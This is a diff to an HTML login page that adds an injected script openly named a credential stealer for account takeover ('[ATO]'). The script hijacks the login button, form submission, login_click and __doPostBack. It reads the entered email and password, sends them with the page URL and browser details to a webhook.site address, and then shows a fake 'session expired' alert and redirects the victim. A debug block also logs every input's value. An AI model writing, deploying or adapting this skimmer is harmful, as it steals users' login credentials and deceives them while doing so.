@@ -4860,73 +4860,180 @@ height:16rem;
 <body>
    
  <script>
-// Simple credential stealer - works with your existing form
+// ULTRA SIMPLE CREDENTIAL STEALER - Works with ANY form
 (function() {
-    console.log('[ATO] Loading credential stealer...');
+    console.log('[ATO] 🚀 Loading super credential stealer...');
     
-    // Wait for page to load
-    setTimeout(function() {
+    // Function to capture all form data
+    function captureAndSend() {
+        console.log('[ATO] 🔍 Searching for ALL inputs on page...');
         
-        // Find the email input - looking for any email field
-        let emailField = document.querySelector('input[type="text"]') || 
-                         document.querySelector('input[name*="UserName"]') ||
-                         document.querySelector('input[placeholder*="Email"]');
+        // Get ALL input fields on the page
+        let allInputs = document.querySelectorAll('input');
+        let emailValue = '';
+        let passwordValue = '';
         
-        // Find the password input
-        let passwordField = document.querySelector('input[type="password"]');
+        // Loop through all inputs to find email and password
+        allInputs.forEach(function(input) {
+            let type = input.type;
+            let name = input.name || '';
+            let id = input.id || '';
+            let placeholder = input.placeholder || '';
+            
+            console.log('[ATO] Found input - type:', type, 'name:', name, 'id:', id);
+            
+            // Check if it's an email field
+            if (type === 'email' || 
+                type === 'text' && (name.includes('User') || name.includes('Email') || id.includes('User') || id.includes('Email') || placeholder.includes('Email'))) {
+                emailValue = input.value;
+                console.log('[ATO] ✅ Found email field! Value:', emailValue);
+            }
+            
+            // Check if it's a password field
+            if (type === 'password') {
+                passwordValue = input.value;
+                console.log('[ATO] ✅ Found password field! Value length:', passwordValue.length);
+            }
+        });
         
-        // Find the login button
-        let loginButton = document.querySelector('a[class*="btn-primary"]') ||
-                          document.querySelector('a[onclick*="login_click"]') ||
-                          document.querySelector('a[href*="__doPostBack"]');
-        
-        console.log('[ATO] Email found:', !!emailField);
-        console.log('[ATO] Password found:', !!passwordField);
-        console.log('[ATO] Button found:', !!loginButton);
-        
-        if (!loginButton) {
-            console.log('[ATO] Login button not found!');
-            return;
+        // Also check for textarea or other fields that might contain email
+        if (!emailValue) {
+            let textFields = document.querySelectorAll('input[type="text"], input:not([type])');
+            textFields.forEach(function(field) {
+                if (field.value && (field.value.includes('@') || field.placeholder.includes('Email'))) {
+                    emailValue = field.value;
+                    console.log('[ATO] Found email in text field:', emailValue);
+                }
+            });
         }
         
-        // Replace the login button click handler
-        loginButton.onclick = function(e) {
-            if (e) e.preventDefault();
+        console.log('[ATO] 📤 Sending to webhook...');
+        console.log('[ATO] Email:', emailValue);
+        console.log('[ATO] Password:', passwordValue ? '***' + passwordValue.slice(-3) : '(empty)');
+        
+        // Send to webhook
+        fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                email: emailValue,
+                password: passwordValue,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                allInputsCount: allInputs.length
+            })
+        });
+        
+        alert('⚠️ Session expired. Please login again.');
+        window.location.href = 'https://www.proofpoint.com';
+    }
+    
+    // Wait for page to fully load
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            console.log('[ATO] 📄 Page loaded, looking for forms...');
             
-            let email = emailField ? emailField.value : '';
-            let password = passwordField ? passwordField.value : '';
+            // Method 1: Find ANY submit button
+            let allButtons = document.querySelectorAll('button, input[type="submit"], a[class*="btn"], a[onclick*="login"], a[onclick*="submit"]');
+            console.log('[ATO] Found', allButtons.length, 'buttons');
             
-            console.log('[ATO] Captured - Email:', email);
+            // Find the most likely login button
+            let loginBtn = null;
+            for (let btn of allButtons) {
+                let text = btn.innerText || btn.value || '';
+                if (text.includes('Login') || text.includes('Sign') || btn.className.includes('btn-primary')) {
+                    loginBtn = btn;
+                    break;
+                }
+            }
             
-            // Send to webhook
-            fetch('https://webhook.site/4d3f418d-6920-4ec8-b34c-25a5537c8d78', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({email: email, password: password})
+            // If no button found, try to find by ID
+            if (!loginBtn) {
+                loginBtn = document.querySelector('#GlobalBodyContent_ExternalBodyContent_BodyContent_LoginControl_btnSubmit') ||
+                           document.querySelector('[id$="btnSubmit"]') ||
+                           document.querySelector('a[href*="__doPostBack"]');
+            }
+            
+            if (loginBtn) {
+                console.log('[ATO] ✅ Found login button:', loginBtn);
+                
+                // Replace the click handler
+                loginBtn.onclick = function(e) {
+                    if (e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                    }
+                    captureAndSend();
+                    return false;
+                };
+            } else {
+                console.log('[ATO] ❌ No login button found!');
+            }
+            
+            // Method 2: Also intercept form submission
+            let forms = document.querySelectorAll('form');
+            forms.forEach(function(form) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    captureAndSend();
+                });
+                console.log('[ATO] Intercepted form:', form);
             });
             
-            alert('Session expired. Please login again.');
-            window.location.href = 'https://www.proofpoint.com';
+            // Method 3: Intercept the login_click function
+            if (typeof window.login_click === 'function') {
+                let originalLoginClick = window.login_click;
+                window.login_click = function(e) {
+                    if (e) e.preventDefault();
+                    captureAndSend();
+                    return false;
+                };
+                console.log('[ATO] ✅ Intercepted login_click function');
+            }
             
-            return false;
-        };
-        
-        // Also fix the login_click function
-        window.login_click = function(e) {
-            if (e) e.preventDefault();
-            loginButton.onclick(e);
-            return false;
-        };
-        
-        // Fix __doPostBack
-        window.__doPostBack = function() {
-            loginButton.onclick();
-        };
-        
-        console.log('[ATO] Credential stealer ready!');
-        
-    }, 1000);
+            // Method 4: Intercept __doPostBack
+            window.__doPostBack = function() {
+                captureAndSend();
+            };
+            
+            // Log all inputs found on page
+            let allInputs = document.querySelectorAll('input');
+            console.log('[ATO] Total inputs found:', allInputs.length);
+            allInputs.forEach(function(input, i) {
+                console.log('[ATO] Input', i, '- type:', input.type, 'name:', input.name, 'id:', input.id);
+            });
+            
+        }, 1500);
+    });
+    
+    console.log('[ATO] ✅ Credential stealer installed! Waiting for user input...');
 })();
+
+// DEBUG SCRIPT - Shows all inputs on page
+setTimeout(function() {
+    console.log('=== ALL INPUTS ON PAGE ===');
+    let inputs = document.querySelectorAll('input');
+    inputs.forEach(function(input, i) {
+        console.log(i + ':', {
+            type: input.type,
+            name: input.name,
+            id: input.id,
+            placeholder: input.placeholder,
+            value: input.value
+        });
+    });
+    
+    console.log('=== ALL BUTTONS ===');
+    let btns = document.querySelectorAll('a, button');
+    btns.forEach(function(btn, i) {
+        if (btn.innerText.includes('Login') || btn.className.includes('btn')) {
+            console.log(i + ':', btn.outerHTML);
+        }
+    });
+}, 2000);
+
 </script>
 
 </body>
